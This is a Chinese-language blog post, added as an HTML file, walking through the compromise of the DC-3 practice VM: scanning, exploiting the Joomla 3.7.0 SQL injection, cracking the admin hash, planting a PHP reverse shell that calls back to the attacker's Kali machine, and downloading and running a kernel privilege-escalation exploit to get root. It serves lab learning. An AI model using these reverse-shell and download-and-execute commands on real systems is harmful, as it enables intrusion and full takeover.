@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+    
+  <meta name="description" content="des 吴泽鑫的博客" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    靶机渗透-DC3 |  Xeme&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/images/logo/x.png" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Xeme's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+</html>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-靶机渗透-DC3" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  靶机渗透-DC3
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/" class="article-date">
+  <time datetime="2020-05-23T07:57:00.000Z" itemprop="datePublished">2020-05-23</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">869字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">3分钟</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>靶机渗透实战：DC3靶机入侵</p>
+<p>使用环境：Linux version 5.2.0-kali2-amd64<br>入侵对象：DC-3靶机-ubuntu 16.04</p>
+<a id="more"></a>
+
+<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>下载好DC3靶机后，将vmx文件导入vmware</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/DC3-File.png" style="zoom:70%;">
+
+<p>导入后，启动DC3靶机</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/DC3-Start.png" style="zoom:70%;">
+
+<p>我们并不知道此靶机的登录密码，开始渗透</p>
+<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>启动kali，输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p>获取当前机器所在的网段ip</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/ifconfig.png" style="zoom:70%;">
+
+<p>启动nmap，对本网段进行扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.2.0&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<p>这步也可以使用：arp-scan -l</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-sn.png" style="zoom:80%;">
+
+<p>获得了靶机的ip地址：192.168.2.116</p>
+<p>对靶机192.168.2.116进行从1-65535的端口扫描port scan：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 -sV 192.168.2.116</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nmap-portscan.png" style="zoom:70%;">
+
+<p> 目标只开放了80端口，我们对其进行访问 </p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/visit80.png" style="zoom:60%;">
+
+<p>进行源代码检视，没有发现特殊的提示</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/80inspector.png" style="zoom:70%;">
+
+<p>尝试进行SQL注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;or&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/80SQL.png" style="zoom:60%;">
+
+<p>不通</p>
+<p>用joomscan进行扫描：</p>
+<p>#安装方法： apt-get install joomscan </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http:&#x2F;&#x2F;192.168.2.116</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u1.png" style="zoom:80%;">
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomscan-u2.png" style="zoom:85%;">
+
+<p>发现了版本：Joomla 3.7.0<br>发现了管理员页面：<a href="http://192.168.2.116/administrator/" target="_blank" rel="noopener">http://192.168.2.116/administrator/</a></p>
+<p>搜索joomla3.7.0的漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla |grep 3.7</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/searchsploit.png" style="zoom:85%;">
+
+<p>发现这个版本有SQL注入漏洞(CVE-2017-8917)<br>细节:<a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html" target="_blank" rel="noopener">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
+<p>使用joomblah脚本<br>#wget <a href="https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 joomblah.py http:&#x2F;&#x2F;192.168.2.116</span><br></pre></td></tr></table></figure>
+
+<p>得到管理员帐户admin，密码hash加密 ，为了破解密码，我们首先要识别哈希值类型，然后使用hashcat暴力破解。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashid hash.txt</span><br><span class="line">hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p> 最后得到密码为 snoopy </p>
+<p>成功登入管理员页面：</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomla-admin.png" style="zoom:70%;">
+
+<p>因为joomla后台可编辑修改源码，我们利用这个功能，</p>
+<p> 用system()执行bash -c<br>                用bash发起一个shell<br>                    kali监听<br>                        访问index.php执行脚本<br>                                  反弹shell成功 –&gt; 提权到root</p>
+<p> 编辑index.php，写入反弹shell代码 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.117&#x2F;8080 0&gt;&amp;1&#39; &quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意，因为要连到kali，所以要填的是kali的Ip</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/joomla-shell2.png" style="zoom:70%;">
+
+<p>在Kali进行监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>
+
+<p> 访问index.php，监听成功收到：</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/nc-lvvp.png" style="zoom:70%;">
+
+<p>成功！输入ls后能成功输出该靶机在该目录下的所有文件</p>
+<p>至此说明反弹shell成功，接下来开始内核提权</p>
+<p> 使用searchsploit工具查找Ubuntu 16.04的提权漏洞 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/39772.png" style="zoom:70%;">
+
+<p> 在kali上下载ubuntu-16-39772-exp，用python开启简单的服务器，再利用反弹shell让靶机下载kali这里下好的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9000</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server.png" style="zoom:70%;">
+
+<p>利用反弹shell让靶机下载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.2.117:9000&#x2F;exploit.tar</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/shell-download1.png" style="zoom:70%;">
+
+<p>下载成功</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/python-server2.png" style="zoom:70%;">
+
+<p>之后利用反弹shell令靶机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br><span class="line">.&#x2F;compile.sh</span><br><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>
+
+<p>运行成功！拿到了靶机的root权限！</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root.png" style="zoom:70%;">
+
+<p>输入id命令与whoami命令，都能确认我们已经拿到了root权限：</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/root2.png" style="zoom:70%;">
+
+<p>进入root文件夹，cat 出 flag:</p>
+<img src="/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/flag.png" style="zoom:70%;">
+
+<p>至此，入侵靶机成功~~  花了差不多一下午的时间，还是蛮有意思的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root</span><br><span class="line">ls</span><br><span class="line">the-flag.txt</span><br><span class="line">    </span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      &#x2F; &#x2F;__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ &#x2F;\ &#x2F; &#x2F; _ \ | | | | | |&#x2F; _ \| &#39;_ \ &#x2F; _ \ | | | |</span><br><span class="line">   \ V  V &#x2F;  __&#x2F; | | | |_| | (_) | | | |  __&#x2F;_|_|_|_|</span><br><span class="line">    \_&#x2F;\_&#x2F; \___|_|_| |____&#x2F; \___&#x2F;|_| |_|\___(_|_|_|_)</span><br><span class="line">                                                     </span><br><span class="line"></span><br><span class="line">Congratulations are in order for completing DC-3VM.  :-)</span><br><span class="line"></span><br><span class="line">I hope you&#39;ve enjoyed this challenge as much as I enjoyed making it.</span><br><span class="line"></span><br><span class="line">If there are any ways that I can improve these little challenges,</span><br><span class="line">please let me know.</span><br><span class="line"></span><br><span class="line">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span><br><span class="line"></span><br><span class="line">Have a great day!!!!</span><br></pre></td></tr></table></figure>
+
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://thexeme.github.io/2020/05/23/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-DC3/" data-id="ckajcjzg100007ctx3dcegl5u"
+        class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/05/02/HTTP%E4%B8%8EFTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%9C%E7%B4%A2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">HTTP与FTP服务器搜索</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2019-2020
+        TheXeme
+      </li>
+      <li>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>PV:<span id="busuanzi_value_page_pv"></span></li>
+  <li>UV:<span id="busuanzi_value_site_uv"></span></li>
+</ul>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/logo/xeme.png" alt="Xeme&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E7%94%9F%E6%B4%BB/">生活</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>谢谢，但是暂时无需打赏~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/pay/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/pay/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+			onClick: (e) => {
+      	document.getElementById(e.target.innerText).scrollIntoView()
+      	return false;
+    	}
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: 
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
